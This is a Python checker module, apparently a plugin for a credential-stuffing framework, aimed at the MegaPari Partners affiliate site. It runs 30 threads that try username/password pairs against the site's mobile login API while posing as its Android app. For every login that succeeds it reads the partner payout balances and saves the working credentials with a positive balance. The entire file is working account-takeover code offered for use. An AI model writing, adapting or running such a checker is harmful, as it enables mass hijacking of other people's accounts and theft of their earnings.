from core.base_checker import BaseChecker
from typing import Dict, Any
import requests


class MegapariChecker(BaseChecker):
    """MegaPari Partners site checker"""

    TOKEN_URL = "https://megaparipartners.com/mobile/Auth/Token"
    BALANCE_URL = "https://megaparipartners.com/mobile/Partner/GetPartnerPayment"

    def get_threads(self) -> int:
        return 30

    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            session = requests.Session()

            # ----------- STEP 1: LOGIN -----------

            payload = {
                "deviceNumber": "f0508eb09c64hjeb6",
                "password": password,
                "userName": username
            }

            headers = {
                "User-Agent": "okhttp/4.12.0",
                "Accept-Encoding": "gzip",
                "api-version": "10.0",
                "x-forwarded-host": "megaparipartners.com",
                "x-project-id": "36_1",
                "content-type": "application/json; charset=UTF-8"
            }

            response = session.post(
                self.TOKEN_URL,
                json=payload,
                headers=headers,
                timeout=15
            )

            # فشل تسجيل الدخول
            if response.status_code != 200:
                return {
                    "status": "invalid",
                    "username": username,
                    "response": response.text
                }

            data = response.json()

            # تحقق من وجود token
            if "result" not in data or "accessToken" not in data["result"]:
                return {
                    "status": "error",
                    "username": username,
                    "response": data
                }

            access_token = data["result"]["accessToken"]

            # ----------- STEP 2: GET BALANCE -----------

            balance_headers = {
                "User-Agent": "okhttp/4.12.0",
                "Accept-Encoding": "gzip",
                "authorization": f"Bearer {access_token}",
                "api-version": "10.0",
                "x-forwarded-host": "megaparipartners.com",
                "x-project-id": "36_1",
                "content-type": "application/json; charset=UTF-8"
            }

            balance_payload = {
                "MerchantId": 6
            }

            balance_response = session.post(
                self.BALANCE_URL,
                json=balance_payload,
                headers=balance_headers,
                timeout=15
            )

            if balance_response.status_code != 200:
                return {
                    "status": "error",
                    "username": username,
                    "response": balance_response.text
                }

            balance_data = balance_response.json()
            result = balance_data.get("result", {})

            # ----------- STEP 3: EXTRACT BALANCES -----------

            mi = float(result.get("MI", 0))
            sc = float(result.get("SC", 0))
            sy = float(result.get("SY", 0))
            smc = float(result.get("SMC", 0))
            sm = float(result.get("SM", 0))
            st = float(result.get("ST", 0))

            total_balance = mi + sc + sy + smc + sm + st

            account_data = {
                "login": username,
                "password": password,
                "token": access_token,
                "balances": {
                    "MI": mi,
                    "SC": sc,
                    "SY": sy,
                    "SMC": smc,
                    "SM": sm,
                    "ST": st
                },
                "total_balance": total_balance,
                "has_balance": total_balance > 0,
                "merchant_id": 6
            }

            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }

        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}

        except requests.exceptions.RequestException as e:
            return {"status": "error", "username": username, "error": str(e)}

        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}

    def should_save(self, account_data: Dict[str, Any]) -> bool:
        return account_data.get("total_balance", 0) > 0

    def save_format(self, account_data: Dict[str, Any]) -> str:
        balances = account_data["balances"]

        balance_parts = [
            f"{key}={value}"
            for key, value in balances.items()
            if value > 0
        ]

        balance_str = " ".join(balance_parts)

        return (
            f"{account_data['login']}:{account_data['password']} | "
            f"{balance_str} | total=${account_data['total_balance']:.2f}\n"
        )
